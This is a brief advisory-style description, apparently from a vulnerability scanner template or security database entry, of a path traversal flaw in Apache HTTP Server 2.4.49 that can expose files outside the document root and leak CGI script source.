  description: A flaw was found in a change made to path normalization in Apache HTTP
    Server 2.4.49. An attacker could use a path traversal attack to map URLs to files
    outside the expected document root. If files outside of the document root are
    not protected by require all denied these requests can succeed. Additionally this
    flaw could leak the source of interpreted files like CGI scripts. This issue is
    known to be exploited in the wild. This issue only affects Apache 2.4.49 and not
    earlier versions.
